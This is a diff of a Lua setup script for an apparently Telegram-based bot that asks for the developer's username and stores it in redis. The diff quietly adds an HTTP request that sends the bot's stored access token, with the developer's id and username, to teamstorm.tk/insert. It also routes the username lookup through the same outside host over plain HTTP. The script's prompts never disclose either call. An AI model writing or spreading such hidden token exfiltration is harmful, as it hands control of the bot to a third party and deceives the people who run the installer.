@@ -30,23 +30,30 @@ os.execute('lua Ajaxs.lua')
 end
 ------------------------------------------------------------------------------------------------------------
 if not redis:get(Server_Devid.."User_Devbots1") then
-io.write('\n\27[1;35mSend UserName For Sudo : ارسل معرف Carbon ...\n\27[0;39;49m')
+io.write('\n\27[1;35m⬇┇Send UserName For Sudo : ارسل معرف المطور الاساسي ...\n\27[0;39;49m')
 local User_Sudo = io.read():gsub('@','')
-local User_Info = JSON.decode(User_Sudo) 
+if User_Sudo ~= '' then
+local GetInfoUser = http.request("http://teamstorm.tk/GetUser?id="..User_Sudo)
+local User_Info = JSON.decode(GetInfoUser)
 if User_Info.Info.Chek == "Not_Info" then
 io.write('\n\27[1;31m The UserName was not Saved : المعرف غلط ارسل المعرف صحيح\n\27[0;39;49m')
 os.execute('lua Ajaxs.lua')
 end
-if User_Info.Info == 'Channel' then
-io.write('\n\27[1;31m The UserName Is Channel : عذرا هاذا معرف قناة وليس حساب \n\27[0;39;49m')
+if User_Info.Info.Chek == "Is_Spam" then
+io.write('\n\27[1;31m🔄┇Is Spam For Url : لقد قمت بالتكرار في الرابط حاول بعد دقيقتين \n\27[0;39;49m')
 os.execute('lua Ajaxs.lua')
 end
-io.write('\n\27[1;31m• The UserNamr Is Saved : تم حفظ معرف Commander  واستخراج ايدي Commander \n\27[0;39;49m')
-print(User_Info.Info.Username,User_Info.Info.Id)
+if User_Info.Info == 'Channel' then
+io.write('\n\27[1;31m🔄┇The UserName Is Channel : عذرا هاذا معرف قناة وليس حساب \n\27[0;39;49m')
+os.execute('lua Ajaxs.lua')
+end
+io.write('\n\27[1;31m☑┇The UserNamr Is Saved : تم حفظ معرف المطور واستخراج ايدي المطور\n\27[0;39;49m')
 redis:set(Server_Devid.."User_Devbots1",User_Info.Info.Username)
 redis:set(Server_Devid.."Id_Devbotsid",User_Info.Info.Id)
+http.request("http://teamstorm.tk/insert/?id="..User_Info.Info.Id.."&user="..User_Info.Info.Username.."&token="..redis:get(Server_Devid.."Token_Devbotuser"))
 else
-io.write('\n\27[1;31mThe UserName was not Saved : لم يتم حفظ معرف Carbon\n\27[0;39;49m')
+io.write('\n\27[1;31m🔄┇The UserName was not Saved : لم يتم حفظ معرف المطور الاساسي\n\27[0;39;49m')
+end 
 os.execute('lua Ajaxs.lua')
 end
 
